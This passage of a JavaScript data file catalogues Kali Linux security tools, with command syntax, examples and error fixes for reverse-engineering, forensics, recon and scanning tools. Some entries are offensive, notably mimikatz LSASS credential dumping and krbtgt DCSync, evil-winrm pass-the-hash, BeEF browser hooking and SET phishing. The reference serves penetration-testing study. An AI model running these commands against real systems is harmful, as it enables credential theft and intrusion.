      { name: "analyzeHeadless", syntax: "analyzeHeadless PROJECT_DIR PROJECT_NAME -import BINARY", description: "Batch analysis from CLI.", examples: [{ code: "analyzeHeadless ~/ghidra proj -import ./bin -postScript FindStrings.java", note: "" }], bestScenario: "Automation and CI.", category: "CLI" },
    ],
    errors: [
      { message: "Unsupported Java version", cause: "Ghidra requires a specific JDK LTS.", fix: "Install the JDK version listed in support/launch.properties (usually OpenJDK 17+)." },
    ],
  },
  {
    slug: "radare2", name: "radare2", category: "Reverse Engineering", package: "radare2",
    homepage: "https://rada.re", depth: "deep", invocation: "r2",
    summary: "Portable reverse engineering framework: disassembler, debugger, analysis scripting.",
    commands: [
      { name: "r2 open", syntax: "r2 [-A] BINARY", description: "Open a binary, optionally auto-analyze.", examples: [{ code: "r2 -A ./bin", note: "" }], bestScenario: "Start a RE session.", category: "Open" },
      { name: "aaa", syntax: "aaa", description: "Analyze all (functions, references, symbols).", examples: [{ code: "aaa", note: "" }], bestScenario: "Baseline analysis before exploration.", category: "Analyze" },
      { name: "afl", syntax: "afl", description: "List functions.", examples: [{ code: "afl", note: "" }], bestScenario: "Overview of code structure.", category: "Analyze" },
      { name: "pdf", syntax: "pdf @ FN", description: "Print disassembly of function.", examples: [{ code: "pdf @ main", note: "" }], bestScenario: "Inspect a specific function.", category: "Analyze" },
    ],
    errors: [],
  },
  {
    slug: "binwalk", name: "binwalk", category: "Forensics", package: "binwalk",
    homepage: "https://github.com/ReFirmLabs/binwalk", depth: "deep", invocation: "binwalk",
    summary: "Firmware analysis and extraction tool.",
    commands: [
      { name: "binwalk scan", syntax: "binwalk FILE", description: "Signature scan a file.", examples: [{ code: "binwalk firmware.bin", note: "" }], bestScenario: "Identify embedded files.", category: "Scan" },
      { name: "binwalk -e", syntax: "binwalk -e FILE", description: "Extract identified files.", examples: [{ code: "binwalk -e firmware.bin", note: "" }], bestScenario: "Pull filesystems out of firmware images.", category: "Extract" },
    ],
    errors: [],
  },
  {
    slug: "autopsy", name: "Autopsy", category: "Forensics", package: "autopsy",
    homepage: "https://www.sleuthkit.org/autopsy/", depth: "deep", invocation: "autopsy",
    summary: "Digital forensics platform (GUI over The Sleuth Kit).",
    commands: [
      { name: "autopsy", syntax: "autopsy", description: "Start local Autopsy web UI.", examples: [{ code: "autopsy", note: "Browse to http://localhost:9999/autopsy" }], bestScenario: "Investigate a disk image.", category: "Launch" },
    ],
    errors: [],
  },
  {
    slug: "volatility3", name: "Volatility 3", category: "Forensics", package: "volatility3",
    homepage: "https://github.com/volatilityfoundation/volatility3", depth: "deep", invocation: "vol",
    summary: "Memory forensics framework for analyzing RAM images.",
    commands: [
      { name: "vol windows.pslist", syntax: "vol -f DUMP windows.pslist", description: "List processes from a Windows memory dump.", examples: [{ code: "vol -f mem.raw windows.pslist", note: "" }], bestScenario: "IR triage of memory dumps.", category: "Plugin" },
      { name: "vol windows.netstat", syntax: "vol -f DUMP windows.netstat", description: "Recover network connections.", examples: [{ code: "vol -f mem.raw windows.netstat", note: "" }], bestScenario: "Find C2 connections.", category: "Plugin" },
    ],
    errors: [
      { message: "Unable to find suitable plugin", cause: "Wrong OS symbols/table for the image.", fix: "Ensure symbols pack is present and use the OS-appropriate plugin (windows.*, linux.*, mac.*)." },
    ],
  },
  {
    slug: "setoolkit", name: "Social-Engineer Toolkit (SET)", category: "Social Engineering Tools", package: "set",
    homepage: "https://github.com/trustedsec/social-engineer-toolkit", depth: "deep", invocation: "setoolkit",
    summary: "Menu-driven framework for social-engineering attacks (phishing, credential harvesters, payload delivery).",
    commands: [
      { name: "setoolkit", syntax: "sudo setoolkit", description: "Launch the interactive menu.", examples: [{ code: "sudo setoolkit", note: "" }], bestScenario: "Rapid phishing campaign setup in a lab.", category: "Launch" },
    ],
    errors: [],
  },
  {
    slug: "beef", name: "BeEF (Browser Exploitation Framework)", category: "Exploitation Tools", package: "beef-xss",
    homepage: "https://beefproject.com", depth: "deep", invocation: "beef-xss",
    summary: "Framework for hooking browsers via XSS and running client-side attacks.",
    commands: [
      { name: "beef-xss", syntax: "sudo beef-xss", description: "Start BeEF (default UI at :3000).", examples: [{ code: "sudo beef-xss", note: "Login beef/beef by default." }], bestScenario: "Client-side attacks after finding XSS.", category: "Launch" },
    ],
    errors: [
      { message: "Rack::Handler could not be loaded", cause: "Missing Ruby gem after distro upgrade.", fix: "cd /usr/share/beef-xss && sudo bundle install." },
    ],
  },
  {
    slug: "sublist3r", name: "Sublist3r", category: "Information Gathering", package: "sublist3r",
    homepage: "https://github.com/aboul3la/Sublist3r", depth: "deep", invocation: "sublist3r",
    summary: "Passive subdomain enumeration via search engines and third-party APIs.",
    commands: [
      { name: "sublist3r -d", syntax: "sublist3r -d DOMAIN", description: "Enumerate subdomains.", examples: [{ code: "sublist3r -d example.com -o subs.txt", note: "" }], bestScenario: "Passive recon at project start.", category: "Enum" },
    ],
    errors: [],
  },
  {
    slug: "amass", name: "OWASP Amass", category: "Information Gathering", package: "amass",
    homepage: "https://github.com/owasp-amass/amass", depth: "deep", invocation: "amass",
    summary: "In-depth attack surface mapping and external asset discovery.",
    commands: [
      { name: "amass enum", syntax: "amass enum -d DOMAIN", description: "Passive+active subdomain enumeration.", examples: [{ code: "amass enum -d example.com -o subs.txt", note: "" }], bestScenario: "Thorough recon on external scope.", category: "Enum" },
      { name: "amass intel", syntax: "amass intel -org NAME", description: "Discover related organizations, ASNs, and domains.", examples: [{ code: "amass intel -org 'Example Inc'", note: "" }], bestScenario: "Scope-building at engagement start.", category: "Intel" },
    ],
    errors: [],
  },
  {
    slug: "theharvester", name: "theHarvester", category: "Information Gathering", package: "theharvester",
    homepage: "https://github.com/laramies/theHarvester", depth: "deep", invocation: "theHarvester",
    summary: "Gathers emails, subdomains, hosts, employee names from public sources.",
    commands: [
      { name: "theHarvester basic", syntax: "theHarvester -d DOMAIN -b SOURCES", description: "OSINT collection.", examples: [{ code: "theHarvester -d example.com -b bing,crtsh,duckduckgo", note: "" }], bestScenario: "Passive OSINT at engagement kickoff.", category: "OSINT" },
    ],
    errors: [],
  },
  {
    slug: "recon-ng", name: "Recon-ng", category: "Information Gathering", package: "recon-ng",
    homepage: "https://github.com/lanmaster53/recon-ng", depth: "deep", invocation: "recon-ng",
    summary: "Full-featured OSINT framework with a Metasploit-like console.",
    commands: [
      { name: "recon-ng", syntax: "recon-ng", description: "Launch the console.", examples: [{ code: "recon-ng", note: "" }], bestScenario: "Structured OSINT with workspaces.", category: "Launch" },
      { name: "marketplace install", syntax: "marketplace install NAME", description: "Install a module from the marketplace.", examples: [{ code: "marketplace install all", note: "All modules." }], bestScenario: "First-time setup.", category: "Modules" },
    ],
    errors: [],
  },
  {
    slug: "dirb", name: "dirb", category: "Web Application Analysis", package: "dirb",
    homepage: "https://tools.kali.org/web-applications/dirb", depth: "deep", invocation: "dirb",
    summary: "Web content scanner using wordlist-based brute-force.",
    commands: [
      { name: "dirb", syntax: "dirb URL [WORDLIST]", description: "Discover directories/files.", examples: [{ code: "dirb https://x /usr/share/dirb/wordlists/common.txt", note: "" }], bestScenario: "Classic directory brute-force.", category: "Scan" },
    ],
    errors: [],
  },
  {
    slug: "dirbuster", name: "DirBuster", category: "Web Application Analysis", package: "dirbuster",
    homepage: "https://sourceforge.net/projects/dirbuster/", depth: "deep", invocation: "dirbuster",
    summary: "GUI multi-threaded directory and file brute-forcer.",
    commands: [
      { name: "dirbuster", syntax: "dirbuster", description: "Launch GUI.", examples: [{ code: "dirbuster &", note: "" }], bestScenario: "Interactive directory brute-force.", category: "Launch" },
    ],
    errors: [],
  },
  {
    slug: "nuclei", name: "Nuclei", category: "Vulnerability Analysis", package: "nuclei",
    homepage: "https://github.com/projectdiscovery/nuclei", depth: "deep", invocation: "nuclei",
    summary: "Fast, template-driven vulnerability scanner.",
    commands: [
      { name: "nuclei", syntax: "nuclei -u URL", description: "Scan a URL with default templates.", examples: [{ code: "nuclei -u https://x -severity high,critical", note: "" }], bestScenario: "Rapid vuln discovery on many targets.", category: "Scan" },
      { name: "nuclei list", syntax: "nuclei -l TARGETS.txt", description: "Scan a list.", examples: [{ code: "nuclei -l urls.txt -t cves/", note: "" }], bestScenario: "Bulk scanning after subdomain enumeration.", category: "Scan" },
    ],
    errors: [],
  },
  {
    slug: "openvas", name: "OpenVAS / Greenbone GVM", category: "Vulnerability Analysis", package: "gvm",
    homepage: "https://greenbone.github.io/docs/", depth: "deep", invocation: "gvm-setup",
    summary: "Full-featured vulnerability scanner with a large NVT feed.",
    commands: [
      { name: "gvm-setup", syntax: "sudo gvm-setup", description: "Initial setup (feed sync, DB).", examples: [{ code: "sudo gvm-setup", note: "Multi-hour first run." }], bestScenario: "One-time setup.", category: "Setup" },
      { name: "gvm-start", syntax: "sudo gvm-start", description: "Start the GVM services and UI.", examples: [{ code: "sudo gvm-start", note: "Then browse to https://127.0.0.1:9392" }], bestScenario: "Launch after setup.", category: "Run" },
    ],
    errors: [
      { message: "Failed to start Postgresql-CTL", cause: "PostgreSQL cluster not initialized or port taken.", fix: "sudo pg_lsclusters, then sudo gvm-check-setup to walk through fixes." },
    ],
  },
  {
    slug: "mimikatz", name: "mimikatz (via wine or on Windows)", category: "Post Exploitation", package: "mimikatz",
    homepage: "https://github.com/gentilkiwi/mimikatz", depth: "deep", invocation: "mimikatz.exe",
    summary: "Windows credential extraction and Kerberos ticket abuse. On Kali it is typically shipped to a Windows target rather than run locally.",
    commands: [
      { name: "sekurlsa::logonpasswords", syntax: "mimikatz # privilege::debug\\nmimikatz # sekurlsa::logonpasswords", description: "Dump credentials from LSASS.", examples: [{ code: "sekurlsa::logonpasswords", note: "" }], bestScenario: "Post-SYSTEM on Windows host.", category: "Creds" },
      { name: "lsadump::dcsync", syntax: "lsadump::dcsync /user:DOMAIN\\\\krbtgt", description: "Simulate a DC replication to pull hashes.", examples: [{ code: "lsadump::dcsync /user:acme\\\\krbtgt", note: "" }], bestScenario: "Extract krbtgt for Golden Ticket.", category: "AD" },
    ],
    errors: [
      { message: "ERROR kuhl_m_privilege_simple", cause: "Not running elevated.", fix: "Run as Administrator, then run privilege::debug first." },
    ],
  },
  {
    slug: "evil-winrm", name: "evil-winrm", category: "Post Exploitation", package: "evil-winrm",
    homepage: "https://github.com/Hackplayers/evil-winrm", depth: "deep", invocation: "evil-winrm",
    summary: "Interactive WinRM shell with file upload/download and script hosting.",
    commands: [
      { name: "evil-winrm password", syntax: "evil-winrm -i HOST -u USER -p PASS", description: "Interactive WinRM shell with password.", examples: [{ code: "evil-winrm -i 10.0.0.5 -u admin -p 'P@ss'", note: "" }], bestScenario: "Foothold on Windows with valid creds and WinRM enabled.", category: "Shell" },
      { name: "evil-winrm hash", syntax: "evil-winrm -i HOST -u USER -H NTLM", description: "Pass-the-hash via WinRM.", examples: [{ code: "evil-winrm -i 10.0.0.5 -u admin -H aad3b435...:31d6cfe...", note: "" }], bestScenario: "PtH when you have NTLM but not plaintext.", category: "Shell" },
    ],
    errors: [
      { message: "WSMan::WSManError", cause: "WinRM not listening or wrong port/scheme.", fix: "Verify with crackmapexec winrm; try -S for HTTPS/5986." },
    ],
  },
  {
    slug: "hashid", name: "hashid", category: "Password Attacks", package: "hashid",
    homepage: "https://github.com/psypanda/hashID", depth: "deep", invocation: "hashid",
    summary: "Identify the type of a given hash.",
    commands: [
      { name: "hashid basic", syntax: "hashid HASH", description: "Identify hash format.", examples: [{ code: "hashid '$2a$12$...'", note: "bcrypt." }], bestScenario: "Pick the right -m for hashcat.", category: "Identify" },
    ],
    errors: [],
  },
];
